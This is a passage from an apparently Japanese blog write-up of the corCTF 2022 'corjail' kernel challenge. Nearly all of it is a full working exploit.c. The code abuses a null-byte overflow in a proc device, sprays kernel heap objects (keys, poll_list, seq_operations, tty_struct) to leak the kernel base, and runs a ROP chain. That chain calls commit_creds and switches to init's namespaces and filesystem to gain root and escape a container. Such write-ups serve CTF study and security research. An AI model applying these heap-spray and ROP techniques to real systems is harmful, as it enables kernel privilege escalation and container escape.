  *rop++ = KADDR(0xffffffff81906510); // pop rdi
  *rop++ = KADDR(0xffffffff82589740); // &amp;init_fs
  *rop++ = KADDR(0xffffffff812e7350); // copy_fs_struct
  *rop++ = KADDR(0xffffffff8131dab0); // push rax; pop rbx

  *rop++ = KADDR(0xffffffff81906510); // pop rdi
  *rop++ = getpid();
  *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid

  *rop++ = KADDR(0xffffffff8117668f); // pop rdx
  *rop++ = 0x6E0;
  *rop++ = KADDR(0xffffffff81029e7d); // add rax, rdx
  *rop++ = KADDR(0xffffffff817e1d6d); // mov qword [rax], rbx ; pop rbx ; ret ; (1 found)
  *rop++ = 0; // trash
</code></pre>
<h3>11. アウトロ</h3>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="uouo fish life"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163612.gif" alt="uouo fish life" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">uouo fish life</figcaption></figure></p>
<p>UOUO FISH LIFE.</p>
<h3>12. Full Exploit</h3>
<div class="codeblock-title">exploit.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">#include &quot;./exploit.h&quot;
#include &lt;bits/pthreadtypes.h&gt;
#include &lt;keyutils.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;unistd.h&gt;

/*********** commands ******************/
#define DEV_PATH &quot;/proc_rw/cormon&quot;   // the path the device is placed

/*********** constants ******************/
#define DESC_KEY_TOBE_OVERWRITTEN_SEQOPS &quot;exploit0&quot;
#define SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS 0x8
#define NUM_KEY_SPRAY (0x60)
#define NUM_2ND_KEY_SPRAY (NUM_KEY_SPRAY * 2)
#define NUM_3RD_KEY_SPRAY (0x10 + 0x8)
#define NUM_3RD_KEY_SIZE (0x290)

#define NUM_PREPARE_KM32_SPRAY 2000

#define NUM_POLLFD (30 + 510 + 1) // stack, kmalloc-4k, kmalloc-32
#define NUM_1ST_POLLLIST_ALLOC (0x10 - 0x1 + 0x1)
#define NUM_2ND_POLLLIST_ALLOC (0x120 + 0x20 + 0x40 + 0x40 + 0x40 + 0x200)
#define TIMEOUT_POLLFD 2000 // 2s

#define NUM_TTY_SPRAY (0x100)

#define NUM_SEQOPERATIONS (NUM_1ST_POLLLIST_ALLOC + 0x100)
#define NUM_FREE_SEQOPERATIONS (0x160)

#define KADDR(addr) ((ulong)addr - 0xffffffff81000000 + kbase)

/*********** globals ******************/

int cormon_fd;
int just_fd;
key_serial_t keys[NUM_KEY_SPRAY * 5] = {0};
int seqops_fd[0x500];
int tty_fd[NUM_TTY_SPRAY * 2];
char *cormon_buf[0x1000 + 0x20] = {0};
pthread_t threads[0x1000];
int num_threads = 0;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

ulong kbase = 0;
int neverend = 0;

char *krop_stack = NULL;
#define KROP_USTACK_SIZE 0x10000

/*********** utils ******************/

int num_keys = 0;
ulong _alloc_key_prefill_ulong_val = 0;
void _alloc_key_prefill_ulong() {
  static char *data = NULL;
  if (data == NULL) data = calloc(0x1000, 1);
  //for (int ix = 0; ix != 32 / 8; ++ix) ((ulong*)data)[ix] = _alloc_key_prefill_ulong_val;
  ((ulong*)data)[0] = _alloc_key_prefill_ulong_val;
  setxattr(&quot;/home/user/.bashrc&quot;, &quot;user.x&quot;, data, 32, XATTR_CREATE);
}
void _alloc_key_prefill_null(void) {
  _alloc_key_prefill_ulong_val = 0;
  _alloc_key_prefill_ulong();
}
void alloc_key(char *payload, int size, void (*prefill)(void)) {
  static char *desc = NULL;
  if (desc == NULL) desc = calloc(1, 0x1000);

  sprintf(desc, &quot;key_%d&quot;, num_keys);
  if (prefill != NULL) prefill();
  keys[num_keys] = add_key(&quot;user&quot;, desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
  if (keys[num_keys] &lt; 0) errExit(&quot;alloc_key&quot;);
  num_keys++;
}
void spray_keys(int num, char c) {
  static char *payload = NULL;
  if (payload == NULL) payload = calloc(1, 0x1000);
  char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
  memset(key_payload, c, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);

  for (int ix = 0; ix != num; ++ix) alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_null);
}
void free_key(key_serial_t key) {
  if (keyctl_revoke(key) != 0) errExit(&quot;keyctl_revoke&quot;);
  if (keyctl_unlink(key, KEY_SPEC_PROCESS_KEYRING) != 0) errExit(&quot;keyctl_unlink&quot;);
  --num_keys;
}

struct alloc_poll_list_t {
  int fd;
  int id;
  int num_size;
  int timeout_ms;
};
void* alloc_poll_list(void *_arg) {
  struct pollfd fds[NUM_POLLFD];
  struct alloc_poll_list_t *arg = (struct alloc_poll_list_t *)_arg;
  assert(arg-&gt;fd &gt;= 2);

  for (int ix = 0; ix != arg-&gt;num_size; ++ix) {
    fds[ix].fd = arg-&gt;fd;
    fds[ix].events = POLLERR;
  }
  pthread_mutex_lock(&amp;mutex);
    ++num_threads;
  pthread_mutex_unlock(&amp;mutex);

  thread_assign_to_core(0);
  if (poll(fds, arg-&gt;num_size, arg-&gt;timeout_ms) != 0) errExit(&quot;poll&quot;);

  pthread_mutex_lock(&amp;mutex);
    --num_threads;
  pthread_mutex_unlock(&amp;mutex);

  if (neverend) {
    thread_assign_to_core(2);
    while(neverend);
  }

  return NULL;
}

void nullbyte_overflow(void) {
  assert(cormon_fd &gt;= 2);
  memset(cormon_buf, 'B', 0x1000 + 0x20);
  strcpy((char*)cormon_buf + 1, &quot;THIS_IS_CORMON_BUFFER&quot;);
  *cormon_buf = 0x00;

  if(write(cormon_fd, cormon_buf, 0x1000) != -1) errExit(&quot;nullbyte_overflow&quot;);
  errno = 0; // `write()` above must fail, so clear errno here
}

/*********** main ******************/

int main(int argc, char *argv[]) {
  char *keybuf = malloc(0x5000); // must be &gt;= 0x4330 (low 2byte of single_next())
  puts(&quot;[.] Starting exploit.&quot;);

  puts(&quot;[+] preparing stack for later kROP...&quot;);
  save_state();
  krop_stack = mmap((void*)0x10000000, KROP_USTACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  if (krop_stack == MAP_FAILED) errExit(&quot;mmap&quot;);

  assign_to_core(0);
  if ((cormon_fd = open(DEV_PATH, O_RDWR)) &lt;= 2) errExit(&quot;open cormon&quot;);

  // Pre-spray kmalloc-32
  puts(&quot;[+] pre-spraying kmalloc-32...&quot;);
  for (int ix = 0; ix != NUM_PREPARE_KM32_SPRAY; ++ix) {
    if (open(&quot;/proc/self/stat&quot;, O_RDONLY) &lt;= 2) errExit(&quot;prespray&quot;);
  }

  // Spray victim `user_key_payload` in kmalloc-32
  puts(&quot;[+] Spraying keys...&quot;);
  spray_keys(NUM_KEY_SPRAY, 'A');

  // Spray poll_list in kmalloc-32 and kmalloc-4k
  just_fd = open(&quot;/etc/hosts&quot;, O_RDONLY);
  printf(&quot;[+] Spraying poll_list (fd=%d)...\n&quot;, just_fd);
  if (just_fd &lt;= 2) errExit(&quot;just_fd&quot;);

  assign_to_core(1);
  num_threads = 0;
  for (int ix = 0; ix != NUM_1ST_POLLLIST_ALLOC + 3; ++ix) {
    struct alloc_poll_list_t *arg = malloc(sizeof(struct alloc_poll_list_t));
    arg-&gt;fd = just_fd; arg-&gt;id = ix;
    arg-&gt;timeout_ms = ix &lt; NUM_1ST_POLLLIST_ALLOC ? TIMEOUT_POLLFD : 1;;
    arg-&gt;num_size = NUM_POLLFD;
    if(pthread_create(&amp;threads[ix], NULL, alloc_poll_list, arg) != 0) errExit(&quot;pthread_create&quot;);
  }

  // Wait some of `poll_list` in kmalloc-4k is freed (these are expected to be reused by cormon_proc_write())
  assign_to_core(0);
  usleep(500 * 1000); // wait threads are initialized
  for(int ix = NUM_1ST_POLLLIST_ALLOC; ix &lt; NUM_1ST_POLLLIST_ALLOC + 3; ++ix) {
    pthread_join(threads[ix], NULL);
  }

  // Spray again victim `user_key_payload` in kmalloc-32
  spray_keys(NUM_KEY_SPRAY, 'A');

  // NULL-byte overflow (hopelly) on `poll_list`, whose `next` pointer get pointing to `user_key_payload` in kmalloc-32.
  puts(&quot;[+] NULL-byte overflow ing...&quot;);
  nullbyte_overflow();

  // Wait all `poll_list` are freed
  for (int ix = 0; ix != NUM_1ST_POLLLIST_ALLOC; ++ix) {
    open(&quot;/proc/self/stat&quot;, O_RDONLY);
    pthread_join(threads[ix], NULL);
  }
  puts(&quot;[+] Freed all 'poll_list'&quot;);

  // Place `seq_operations` on UAFed `user_key_payload` in kmalloc-32
  for(int ix = 0; ix != NUM_SEQOPERATIONS; ++ix) {
    if ((seqops_fd[ix] = open(&quot;/proc/self/stat&quot;, O_RDONLY)) &lt;= 2) errExit(&quot;open seqops&quot;);
  }

  // Check all keys to leak kbase via `seq_operations`
  ulong single_show = 0;
  key_serial_t uafed_key = 0;
  for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) {
    int num_read;
    memset(keybuf, 0, 0x5000);
    if((num_read = keyctl_read(keys[ix], keybuf, 0x5000)) &lt;= 0) errExit(&quot;keyctl_read&quot;);
    if (strncmp(keybuf, &quot;AAAA&quot;, 4) != 0) {
      single_show = *(ulong*)keybuf;
      uafed_key = keys[ix];
      if (single_show == 0) {
        puts(&quot;[-] somehow, empty key found&quot;);
      } else break;
    }
  }
  if (single_show == 0) {
    puts(&quot;[-] Failed to leak kbase&quot;);
    exit(1);
  }
  printf(&quot;[!] leaked single_show: 0x%lx\n&quot;, single_show);
  kbase = single_show - (0xffffffff813275c0 - 0xffffffff81000000);
  printf(&quot;[!] leaked kbase: 0x%lx\n&quot;, kbase);

  // Free all keys except UAFed key
  for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) {
    if (keys[ix] != uafed_key) free_key(keys[ix]);
  }
  sleep(1); // wait GC(security/keys/gc.c) actually frees keys

  // Place `tty_file_private` on UAFed `user_key_payload` in kmalloc-32
  for (int ix = 0; ix != NUM_TTY_SPRAY; ++ix) {
    if ((tty_fd[ix] = open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY)) &lt;= 2) errExit(&quot;open tty&quot;);
  }

  // Read `tty_file_private.tty` which points to `tty_struct` in kmalloc-1024
  memset(keybuf, 0, 0x5000);
  int num_read = 0;
  if((num_read = keyctl_read(uafed_key, keybuf, 0x5000)) &lt;= 0) errExit(&quot;keyctl_read&quot;);
  printf(&quot;[+] read 0x%x bytes from UAFed key\n&quot;, num_read);
  ulong km1024_leaked = 0;
  ulong *tmp = (ulong*)keybuf + 1;
  for (int ix = 0; ix != 0x4330/8 - 2 - 1; ++ix) {
    if (
      (tmp[ix] &gt;&gt; (64-4*4)) == 0xFFFF &amp;&amp; // tty must be in kheap
      (tmp[ix + 1] &gt;&gt; (64-4*4)) == 0xFFFF &amp;&amp; // file must be in kheap
      tmp[ix+2] == tmp[ix+3] &amp;&amp; tmp[ix+2] != 0 &amp;&amp; // list_head's next and prev are same
      (tmp[ix] &amp; 0xFF) == 0x00 &amp;&amp; // tty must be 0x100 aligned
      (tmp[ix + 1] &amp; 0xFF) == 0x00 &amp;&amp; // file must be 0x100 aligned
      (tmp[ix + 2] &amp; 0xF) == 0x08
    ) {
      if (km1024_leaked == 0) {
        km1024_leaked = tmp[ix];
        printf(&quot;[!] \t+0: 0x%lx (tty)\n&quot;, tmp[ix]);
        printf(&quot;[!] \t+1: 0x%lx (*file)\n&quot;, tmp[ix + 1]);
        printf(&quot;[!] \t+2: 0x%lx (list_head.next)\n&quot;, tmp[ix + 2]);
        printf(&quot;[!] \t+3: 0x%lx (list_head.prev)\n&quot;, tmp[ix + 3]);
        break;
      }
    }
  }
  if (km1024_leaked == 0) {
    print_curious(keybuf, 0x4300, 0);
    errExit(&quot;Failed to leak kmalloc-1024&quot;);
  }
  printf(&quot;[!] leaked kmalloc-1024: 0x%lx\n&quot;, km1024_leaked);

  /********************************************************/

  // Free `seq_operations`, one of which is `user_key_payload`
  for (int ix = NUM_SEQOPERATIONS - NUM_FREE_SEQOPERATIONS; ix != NUM_SEQOPERATIONS; ++ix) {
    close(seqops_fd[ix]);
  }
  puts(&quot;[+] Freeed seq_operations&quot;);

  sleep(5); // TODO
  // Spray `poll_list` in kmalloc-32, one of which is placed on `user_key_payload`
  assign_to_core(2);
  neverend = 1;
  puts(&quot;[+] spraying `poll_list` in kmalloc-32...&quot;);
  num_threads = 0;
  for (int ix = 0; ix != NUM_2ND_POLLLIST_ALLOC; ++ix) {
    struct alloc_poll_list_t *arg = malloc(sizeof(struct alloc_poll_list_t));
    arg-&gt;fd = just_fd; arg-&gt;id = ix;
    arg-&gt;timeout_ms = 3000; // must 1000 &lt; timeout_ms, to wait key GC
    arg-&gt;num_size = 30 + 2;
    if(pthread_create(&amp;threads[ix], NULL, alloc_poll_list, arg) != 0) errExit(&quot;pthread_create&quot;);
  }
  // wait threads are initialized (to prevent double free)
  assign_to_core(0);
  while(num_threads != NUM_2ND_POLLLIST_ALLOC);
  usleep(300 * 1000);

  // Revoke UAFed key, which is on `poll_list` in kmalloc-32
  puts(&quot;[+] Freeing UAFed key...&quot;);
  free_key(uafed_key);
  sleep(1);

  // Spray keys on UAFed `poll_list`
  puts(&quot;[+] spraying keys in kmalloc-32&quot;);
  assert(num_keys == 0);
  {
    char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
    memset(key_payload, 'X', SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
    ((ulong*)key_payload)[0] = 0x9999999999999999; // debug
     _alloc_key_prefill_ulong_val = km1024_leaked - 0x18; // 0x18 is offset where `user_key_payload` can modify from

    for (int ix = 0; ix != NUM_2ND_KEY_SPRAY; ++ix) {
      alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_ulong);
    }
  }

  puts(&quot;[+] waiting corrupted `poll_list` is freed...&quot;);
  neverend = 0;
  for(int ix = 0; ix != NUM_2ND_POLLLIST_ALLOC; ++ix) {
    pthread_join(threads[ix], NULL);
  }

  // Free all keys
  for (int ix = 0; ix != NUM_2ND_KEY_SPRAY; ++ix) {
    free_key(keys[ix]);
  }
  puts(&quot;[+] waiting all keys are freed by GC...&quot;);
  sleep(1); // wait GC(security/keys/gc.c) actually frees keys

  // Spray keys in `kmalloc-1024`, one of which must be placed on `tty_struct`
  puts(&quot;[+] spraying keys in kmalloc-1024&quot;);
  assert(num_keys == 0);
  {
    char *key_payload = malloc(0x1000);
    ulong *buf = (ulong*)key_payload;
    buf[0] = 0x5401; // magic, kref (later `leave`ed and become RBP)
    buf[1] = KADDR(0xffffffff8191515a); // dev (later become ret addr of `leave` gadget, which is `pop rsp`)
    buf[2] = km1024_leaked + 0x50 + 0x120; // driver (MUST BE VALID) (later `pop rsp`ed)
    buf[3] = km1024_leaked + 0x50; // ops

    ulong *ops = (ulong*)(key_payload + 0x50);
    for (int ix = 0; ix != 0x120 / 8; ++ix) { // sizeof tty_operations
      ops[ix] = KADDR(0xffffffff81577609); // pop rsp
    }

    ulong *rop = (ulong*)((char*)ops + 0x120);
    *rop++ = KADDR(0xffffffff81906510); // pop rdi
    *rop++ = 0;
    *rop++ = KADDR(0xffffffff810ebc90); // prepare_kernel_cred

    *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`)
    *rop ++ = 0;
    *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
    *rop++ = KADDR(0xffffffff810eba40); // commit_creds

    *rop++ = KADDR(0xffffffff81906510); // pop rdi
    *rop++ = 1; // init process in docker container
    *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid
    *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`)
    *rop ++ = 0;
    *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
    *rop++ = KADDR(0xffffffff819b21d3); // pop rsi
    *rop++ = KADDR(0xffffffff8245a720); // &amp;init_nsproxy
    *rop++ = KADDR(0xffffffff810ea4e0); // switch_task_namespaces

    *rop++ = KADDR(0xffffffff81906510); // pop rdi
    *rop++ = KADDR(0xffffffff82589740); // &amp;init_fs
    *rop++ = KADDR(0xffffffff812e7350); // copy_fs_struct
    *rop++ = KADDR(0xffffffff8131dab0); // push rax; pop rbx

    *rop++ = KADDR(0xffffffff81906510); // pop rdi
    *rop++ = getpid();
    *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid

    *rop++ = KADDR(0xffffffff8117668f); // pop rdx
    *rop++ = 0x6E0;
    *rop++ = KADDR(0xffffffff81029e7d); // add rax, rdx
    *rop++ = KADDR(0xffffffff817e1d6d); // mov qword [rax], rbx ; pop rbx ; ret ; (1 found)
    *rop++ = 0; // trash


    *rop++ = KADDR(0xffffffff81c00ef0 + 0x16); // swapgs_restore_regs_and_return_to_usermode + 0x16
                                               // mov rdi,rsp; mov rsp,QWORD PTR gs:0x6004; push QWORD PTR [rdi+0x30]; ...
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (ulong)NIRUGIRI;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = (ulong)krop_stack + KROP_USTACK_SIZE / 2;
    *rop++ = user_ss;

    printf(&quot;[+] size: 0x%lx\n&quot;, (ulong)rop - (ulong)key_payload);
    assert((ulong)rop - (ulong)key_payload &lt;= NUM_3RD_KEY_SIZE);
    assert(512 &lt; NUM_3RD_KEY_SIZE + 0x10 &amp;&amp; NUM_3RD_KEY_SIZE + 0x10 &lt; 1024);
    for (int ix = 0; ix != NUM_3RD_KEY_SPRAY; ++ix) alloc_key(key_payload, NUM_3RD_KEY_SIZE + 0x10, NULL);
  }

  // Invoke tty_struct.ops.ioctl
  puts(&quot;[+] ioctl-ing to /dev/ptmx&quot;);
  for (int ix = 0; ix != NUM_TTY_SPRAY; ++ix) {
    ioctl(tty_fd[ix], 0x1234567890, 0xABCDE0000);
  }

  // end of life (unreachable)
  puts(&quot;[ ] END of life...&quot;);
  //sleep(999999);
}
</code></pre>
<h3>13. 参考</h3>
<ul>
<li><a href="https://syst3mfailure.io/corjailhttps://syst3mfailure.io/corjail">Author’s writeup</a></li>
<li><a href="https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/corjail/task/build">corCTF2022 archive</a></li>
</ul>


      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/highlight.min.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
      <script>hljs.highlightAll(); hljs.initLineNumbersOnLoad({singleLine:true});</script>
      <!-- You have to add `<link href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/styles/default.min.css">` -->
    